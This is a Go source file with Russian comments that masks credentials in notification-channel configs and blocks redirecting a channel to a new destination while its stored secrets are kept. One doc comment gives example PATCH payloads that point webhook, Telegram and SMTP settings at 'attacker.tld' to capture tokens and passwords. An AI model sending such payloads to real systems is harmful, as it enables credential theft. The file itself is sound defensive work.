package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix — маркерный префикс маскированного значения. Когда API отдаёт
// обратно учётные данные, реальное содержимое заменяется значением с этим
// префиксом; если запрос на обновление приходит со значением с этим
// префиксом, это означает «оставить в БД исходное значение без изменений».
//
// Префикс выбран вместо пустой строки или фиксированной константы, чтобы
// попутно нести немного различимой информации (см. MaskedValue) — так
// пользователь может понять, «это какой бот», не вставляя ключ заново.
const MaskedPrefix = "__masked__"

// MaskedValue формирует маскированное значение:
//
//	"__masked__"              исходное значение слишком короткое, подсказки нет
//	"__masked__:…ab12cd"      последние 6 символов исходного значения как подсказка
//
// Показывать только последние 6 символов — осознанный выбор: различимая
// часть адреса webhook находится в конце (например, key в WeCom или id бота
// в Feishu), а префиксная часть у всех ботов одинаковая и не несёт
// различимой информации. Последних 6 символов недостаточно, чтобы
// восстановить учётные данные, но достаточно, чтобы тот, кто настраивает
// канал, узнал «это моя группа».
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked сообщает, является ли значение маскированным (то есть не было
// изменено после того, как API вернул его обратно).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig возвращает копию конфигурации, заменяя поля с учётными данными
// этого канала на маскированные значения.
//
// Для неизвестного типа канала возвращается пустая map, а не исходная
// конфигурация — пусть лучше UI покажет «конфигурация недоступна», чем при
// нераспознанном типе канала целиком отдать обратно исходное содержимое,
// которое может включать учётные данные. Поля без учётных данных сохраняются
// как есть, чтобы UI мог нормально их показать.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Вложенные структуры вроде headers обрабатываются целиком как одно
		// учётное значение: чтобы разбирать их по отдельным подключам,
		// каждому каналу придётся заново объявлять набор правил «какие
		// подключи являются учётными данными» — сложность вырастет куда
		// больше, чем выгода.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials означает «адрес назначения
// изменился, но вызывающая сторона не высказалась насчёт полей с учётными
// данными». Эта ошибка возвращается вместо того, чтобы молча пропустить
// изменение или молча отбросить учётные данные — причины см. в
// PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // ключи назначения, которые изменились
	Missing []string // ключи учётных данных, по которым не было явного ответа
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Адрес назначения (" + strings.Join(e.Changed, ", ") + ") изменён, заполните также поля учётных данных (" +
		strings.Join(e.Missing, ", ") + "): укажите новое значение или явно оставьте пустым, если учётные данные больше не нужны. " +
		"Старые учётные данные действительны только для старого адреса, их повторное использование равносильно передаче новому адресу."
}

// PrepareConfigUpdate объединяет конфигурацию канала и обрабатывает
// security-значимую ситуацию «адрес назначения изменился».
//
// Она заменяет голый MergeConfig на пути обновления канала и закрывает
// практически воспроизводимый сценарий: адрес назначения (куда отправлять
// сообщение) и учётные данные (от чьего имени отправлять) — два независимых
// набора полей, а MergeConfig для «не упомянутых» ключей всегда сохраняет
// значение из БД. Поэтому любой, кто может сделать PATCH канала, может,
// **изменив только адрес и ничего не сказав про учётные данные**, заставить
// сервер отправить реальные учётные данные из БД на эндпоинт, который он
// контролирует:
//
//	webhook  {config:{url:"https://attacker.tld"}}      → исходный заголовок Authorization уходит с запросом
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<реальный Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}        → после STARTTLS уходят логин и пароль
//
// Этот путь полностью бесшумен, не зависит от редиректов (поэтому запрет
// межхостовых переходов его не перекрывает), и напрямую обходит цель
// механизма маскирования этого пакета — «учётные данные не возвращаются в
// браузер».
//
// Правило: если какой-либо ключ назначения меняется на новое значение,
// вызывающая сторона обязана явно высказаться по **каждому** ключу учётных
// данных:
//   - дано новое значение → используется новое значение
//   - явно передана пустая строка → поле больше не требует учётных данных
//     (семантика очистки сохраняется)
//   - возвращено как есть маскированное значение / ключ вообще не упомянут → отказ
//
// Третий случай отклоняется тоже, потому что смысл «маскированного значения»
// — это именно «использовать старые учётные данные», а старые учётные
// данные действительны только для старого адреса. Здесь намеренно не
// делается «автоматический сброс учётных данных» — для необязательных полей
// учётных данных (headers у webhook, password у email) это бесшумно
// превратится в «аутентификации больше нет, но интерфейс возвращает 200» —
// такое сложнее диагностировать, чем явную ошибку. Пусть лучше оператор
// заполнит поле ещё раз.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("тип канала %q не зарегистрирован", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// Если в нестроковом значении учётных данных (например, headers у
	// webhook — это объект) встроен маскированный литерал, значит
	// вызывающая сторона засунула сторожевое значение «оставить как есть»
	// внутрь структуры. MergeConfig считает маскированным только «строку с
	// этим префиксом», и такая форма будет сохранена как обычный объект —
	// в БД буквально попадёт литерал "__masked__", после чего
	// аутентификация бесшумно перестанет работать без какой-либо ошибки.
	// Лучше отклонить такой запрос сразу.
	//
	// Эта проверка должна стоять **первой**: при неизменном адресе код
	// уходит через досрочный return, и если поставить проверку позже, она
	// будет покрывать только путь «адрес изменился» (именно так была
	// ошибка в первой версии — тест сразу её поймал).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Находим ключи назначения, которые действительно изменились.
	// Маскированное значение равносильно «не изменилось».
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Адрес не менялся — обычное объединение (маскированное значение
		// сохраняет исходное, пустая строка очищает, остальное
		// перезаписывается).
		return MergeConfig(stored, incoming), nil
	}

	// Адрес изменился: требуем явного ответа по каждому ключу учётных
	// данных.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers отклоняет попытки передать маскированное
// сторожевое значение внутри нестроковой структуры.
//
// Механизм маскирования построен на допущении, что всё значение — это
// строка. Для полей-объектов, таких как headers у webhook, маскировать
// можно только целиком (записав строку "__masked__") или передавать целиком
// новое значение; засовывание сторожевого значения внутрь объекта не может
// выразить «оставить без изменений» и будет сохранено в БД как настоящее
// значение.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("поле %s содержит маскирующую метку %q: это поле можно только целиком оставить пустым (использовать текущее значение) или целиком передать новое значение — маскирующий placeholder внутри структуры недопустим",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue сравнивает два значения конфигурации на эквивалентность.
// Сравнение через сериализацию в JSON попутно решает проблему различия
// типов — порт, отправленный фронтендом, это number, а считанный из БД —
// float64, прямое == дало бы ложное несовпадение.
//
// «Пустоту» нужно сначала привести к общему виду и только потом сравнивать:
// пустая строка и «ключ отсутствует» в этой модели конфигурации — одно и то
// же состояние, потому что MergeConfig воспринимает пустую строку как явную
// очистку и просто удаляет ключ. Без такой нормализации необязательное
// поле назначения, которое всегда оставляют пустым (base_url у Telegram —
// единственное такое поле: пустое значение означает использование
// официального адреса), пойдёт по следующему пути:
//
//	при создании сохраняется base_url:""  →  при первом сохранении MergeConfig удаляет ключ
//	→ при втором сохранении incoming = "", а в stored ключа нет → это считается «адрес изменился»
//	→ учётные данные маскированы → 400 «адрес назначения изменён, заполните также поля учётных данных»
//
// После этого каждое последующее сохранение будет проваливаться, пока
// пользователь не вставит Bot Token заново — хотя он ничего не менял.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue определяет, является ли значение конфигурации
// «пустым». Критерий должен совпадать с тем, как MergeConfig определяет
// очистку (strings.TrimSpace(s) == ""), иначе возникнет разрыв:
// «MergeConfig считает, что нужно удалить, а sameConfigValue считает, что
// значение есть».
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig объединяет incoming с stored, используется при обновлении
// конфигурации канала.
//
// Правила:
//   - ключ, у которого в incoming маскированное значение → сохраняется
//     исходное значение из stored (пользователь не менял это поле)
//   - ключ, у которого в incoming пустая строка → считается явной очисткой,
//     ключ удаляется
//   - остальные ключи → перезаписываются значением из incoming
//   - ключ, который есть в stored, но отсутствует в incoming → сохраняется
//     (семантика частичного обновления)
//
// Нужно явно решить, считается ли пустая строка «очисткой»: форма на
// фронтенде отправляет незаполненные поля как пустую строку, и если
// воспринимать это как настоящее значение, поле, которое должно было
// остаться с исходным значением, будет действительно очищено. Здесь
// выбрана явная очистка, потому что у пользователя нет другого способа
// явно очистить неверно заданное поле (можно было бы различать «не
// передано» и «передано пустое значение», но UI этим различием не
// пользуется).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // маскированное значение = не изменено, сохраняем stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
